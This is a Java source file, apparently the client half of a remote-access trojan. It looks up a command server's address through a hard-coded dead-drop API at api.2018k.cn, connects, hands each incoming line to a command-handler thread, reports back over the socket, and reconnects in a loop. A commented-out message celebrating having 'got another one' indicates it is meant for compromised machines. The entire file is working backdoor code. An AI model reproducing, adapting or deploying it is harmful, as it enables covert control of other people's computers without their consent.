import java.net.*;
import java.io.*;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.TimeUnit;

public class Main {

    public static void main(String [] args) throws IOException, InterruptedException {

        //showMessageDialog(null, "恭喜，搞定一台！");

        int tryTimes = 0;

        do {

            //读取服务器信息
            String API = "http://api.2018k.cn/getExample?id=1d1a237d5bd148e7a2538561551b3709&data=url";
            String ret = toUrl(API, "GET");
            String[] config = ret.split("\\|");
            String IP = config[0];
            int PORT = Integer.parseInt(config[1]);
            System.out.print("尝试连接至服务器：" + IP + ":" + PORT);

            //设置Socket
            Global.client = new Socket();
            Global.client.setSoTimeout(0);

            //循环尝试连接
            try {
                Global.client.connect(new InetSocketAddress(IP, PORT), 0);
            } catch (Exception e) {
                //失败输出以及等待
                tryTimes ++;
                System.out.println(" -> 第" + tryTimes + "次尝试失败...");
                if (tryTimes <= 60) {
                    TimeUnit.SECONDS.sleep(5);
                } else {
                    TimeUnit.MINUTES.sleep(1);
                }
                continue;
            }

            //连接成功输出信息
            System.out.println(" -> 第" + (tryTimes + 1) + "次连接成功！");
            System.out.println("--------------------------------");
            System.out.println("客户端信息：" + Global.client.getLocalSocketAddress());
            System.out.println("服务器信息：" + Global.client.getInetAddress() + ":" + Global.client.getPort());
            System.out.println("--------------------------------");

            //等待服务器输入
            InputStream input = Global.client.getInputStream(); //获取字节输入流
            BufferedReader br = new BufferedReader(new InputStreamReader(input)); //包装为缓冲字符流
            String info;
            while ((info = br.readLine()) != null && !Global.exit) {
                    //创建一个处理指令的线程
                    Command Thread = new Command(info);
                    Thread.start();
            }

            //断连释放数据
            Global.client.shutdownInput();
            Global.client.close();
            input.close();
            br.close();
            tryTimes = 0;
            System.out.println("--------------------------------");
            if (Global.exit) {
                System.out.println("断开连接，照指令关闭自身");
            } else {
                System.out.println("断开连接，等待连接至服务器...");
            }

        } while(!Global.exit);

    }

    public static void sendMsg(String msg) {
        //向服务器端发送一条消息
        try {
            OutputStream output = Global.client.getOutputStream();
            BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(output));
            bw.write(msg);
            bw.flush();
        } catch (IOException ignored) {}

    }

    public static String toUrl(String path, String method) { //API
        StringBuilder sb = new StringBuilder();
        try {
            URL url = new URL(path);
            //打开和url之间的连接
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();

            //设置是否向httpUrlConnection输出，设置是否从httpUrlConnection读入，此外发送post请求必须设置这两个
            conn.setDoOutput(true);
            conn.setDoInput(true);
            //GET和POST必须全大写
            conn.setRequestMethod(method);
            // 设置不用缓存
            conn.setUseCaches(false);
            conn.setRequestProperty("accept", "*/*");
            conn.setRequestProperty("connection", "Keep-Alive");
            conn.setRequestProperty("user-agent", "Mozilla/4.0 (compatible; MSE 6.0; Windows NT 5.1; SV1)");
            // 设置文件字符集:
            conn.setRequestProperty("Charset", "UTF-8");

            // 设置文件类型:
            conn.setRequestProperty("contentType", "application/json");

            conn.connect();

            // 请求返回的状态
            if (conn.getResponseCode() == 200) {
                //System.out.println("连接成功");
                //获取URLConnection对象对应的输入流
                InputStream is = conn.getInputStream();
                //构造一个字符流缓存
                BufferedReader br = new BufferedReader(new InputStreamReader(is));
                String str;
                while ((str = br.readLine()) != null) {
                    //解决中文乱码问题
                    str = new String(str.getBytes(), StandardCharsets.UTF_8);
                    sb.append(str);
                    //System.out.println(str);
                }
                //关闭流
                is.close();
            }
            //断开连接，最好写上，disconnect是在底层tcp socket链接空闲时才切断。如果正在被其他线程使用就不切断。
            //固定多线程的话，如果不disconnect，链接会增多，直到收发不出信息。写上disconnect后正常一些。
            conn.disconnect();
            //System.out.println("完整结束");
        } catch (Exception e) {
            e.printStackTrace();
        }
        return sb.toString();
    }

}